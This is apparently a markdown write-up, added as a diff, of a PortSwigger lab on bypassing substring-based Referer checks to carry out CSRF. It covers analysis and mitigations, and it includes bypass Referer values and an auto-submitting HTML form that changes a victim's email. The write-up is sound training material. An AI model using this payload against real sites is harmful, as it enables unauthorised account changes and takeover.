@@ -1,0 +1,253 @@
+# CSRF with Broken Referer Validation
+
+> **Platform:** PortSwigger Web Security Academy
+> **Category:** Cross-Site Request Forgery (CSRF)
+> **Difficulty:** Apprentice
+> **Status:** ✅ Solved
+
+---
+
+# Overview
+
+This lab demonstrates how an application attempts to prevent Cross-Site Request Forgery (CSRF) attacks by validating the `Referer` header instead of using anti-CSRF tokens.
+
+The implementation is flawed because the server only checks whether the expected domain appears somewhere inside the `Referer` header, rather than validating the actual origin of the request. As a result, an attacker can craft a malicious URL that includes the trusted domain as part of the query string and successfully bypass the protection.
+
+---
+
+# Learning Objectives
+
+After completing this lab I was able to:
+
+* Understand how Referer-based CSRF protections work.
+* Identify weak Referer validation.
+* Bypass substring-based origin checks.
+* Develop a working CSRF exploit.
+* Understand why CSRF tokens remain the preferred defense.
+
+---
+
+# Lab Information
+
+| Field          | Value                                |
+| -------------- | ------------------------------------ |
+| Category       | CSRF                                 |
+| Difficulty     | Apprentice                           |
+| Vulnerability  | Broken Referer Validation            |
+| CWE            | CWE-352 – Cross-Site Request Forgery |
+| OWASP Top 10   | A01:2021 – Broken Access Control     |
+| Estimated CVSS | 6.5 (Medium)                         |
+
+---
+
+# Background
+
+Cross-Site Request Forgery (CSRF) occurs when a victim's browser is tricked into sending an authenticated request to a vulnerable application without the user's consent.
+
+Some applications attempt to prevent CSRF attacks by checking the `Referer` header. While this can provide an additional security layer, it is unreliable if implemented incorrectly.
+
+In this lab, the application only verifies whether the trusted domain appears anywhere inside the `Referer` header instead of validating the actual origin. This weak validation can be bypassed by embedding the trusted domain within an attacker-controlled URL.
+
+---
+
+# Reconnaissance
+
+After logging in, changing the email address generated the following request:
+
+```http
+POST /my-account/change-email HTTP/2
+
+email=test@example.com
+```
+
+Observations:
+
+* No CSRF token was present.
+* Authentication relied exclusively on the session cookie.
+* The request was accepted only when the `Referer` header passed validation.
+
+---
+
+# Vulnerability Analysis
+
+Testing the endpoint with Burp Suite Repeater showed that requests with an unrelated `Referer` header were rejected.
+
+Example:
+
+```http
+Referer: https://evil.com/
+```
+
+However, when the trusted lab domain appeared anywhere inside the URL, the request was accepted:
+
+```http
+Referer: https://evil.com/?0a123456.web-security-academy.net
+```
+
+This confirmed that the application performed a simple substring comparison instead of validating the request origin.
+
+Because the browser automatically includes the `Referer` header when submitting forms, an attacker can abuse this behavior to bypass the protection.
+
+---
+
+# Attack Flow
+
+```text
+Attacker
+    │
+    ▼
+Hosts malicious HTML page
+    │
+    ▼
+Victim visits attacker-controlled page
+    │
+    ▼
+Browser automatically submits authenticated form
+    │
+    ▼
+Referer contains trusted domain as substring
+    │
+    ▼
+Application accepts request
+    │
+    ▼
+Victim's email address is changed
+```
+
+---
+
+# Proof of Concept
+
+```html
+<html>
+<body>
+
+<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
+```
+
+The exploit is hosted on the PortSwigger Exploit Server using a URL that causes the browser to send a `Referer` header containing the trusted domain inside the query string.
+
+Since the application only performs substring matching, the forged request is accepted.
+
+---
+
+# Exploitation Steps
+
+1. Log into the application.
+2. Capture the email change request with Burp Suite.
+3. Confirm that no CSRF token is present.
+4. Send the request to Repeater.
+5. Test different `Referer` values.
+6. Confirm that substring matching is used.
+7. Create the HTML exploit.
+8. Upload it to the Exploit Server.
+9. Deliver the exploit to the victim.
+10. The victim's email address is modified automatically.
+
+---
+
+# Root Cause
+
+The application relies on the `Referer` header as its only CSRF protection mechanism.
+
+Instead of validating that the request originated from a trusted origin, it simply searches for the expected domain as a substring within the header.
+
+Because attackers can embed arbitrary text inside URLs, this validation is easily bypassed.
+
+---
+
+# Impact
+
+A successful attacker can:
+
+* Perform authenticated requests on behalf of another user.
+* Modify account information.
+* Change user email addresses.
+* Trigger other state-changing actions.
+* Potentially compromise user accounts if sensitive operations are vulnerable.
+
+---
+
+# Mitigations
+
+Recommended mitigations include:
+
+* Implement unpredictable CSRF tokens for every state-changing request.
+* Validate the exact request origin using the `Origin` header.
+* Use strict `Referer` validation only as a secondary defense.
+* Reject malformed or missing origin headers.
+* Configure authentication cookies with the `SameSite` attribute where appropriate.
+
+---
+
+# Lessons Learned
+
+* `Referer` headers should never be the sole CSRF protection.
+* Substring matching is not equivalent to origin validation.
+* CSRF tokens remain the most reliable mitigation.
+* Security controls should validate exact origins rather than searching for trusted strings.
+
+---
+
+# References
+
+* PortSwigger Web Security Academy – CSRF
+* OWASP Cross-Site Request Forgery Prevention Cheat Sheet
+* CWE-352 – Cross-Site Request Forgery
+* RFC 9110 – HTTP Semantics
+
+---
+
+# Classification
+
+## CWE
+
+* CWE-352 – Cross-Site Request Forgery
+
+## OWASP Top 10
+
+* A01:2021 – Broken Access Control
+
+---
+
+# Skills Practiced
+
+* Burp Suite Proxy
+* Burp Repeater
+* HTTP Request Analysis
+* CSRF Testing
+* Referer Validation Bypass
+* Exploit Development
+
+---
+
+# Tools Used
+
+* Burp Suite Community Edition
+* Firefox
+* PortSwigger Exploit Server
+* Developer Tools
+
+---
+
+# Key Takeaways
+
+* CSRF protection should never rely solely on the `Referer` header.
+* Origin validation must compare trusted origins exactly.
+* Substring matching introduces bypass opportunities.
+* Anti-CSRF tokens remain the industry standard for preventing CSRF attacks.
+
+---
+
+# Result
+
+✅ Successfully exploited weak `Referer` validation to perform a Cross-Site Request Forgery attack, demonstrating how improper origin verification can completely undermine CSRF defenses.
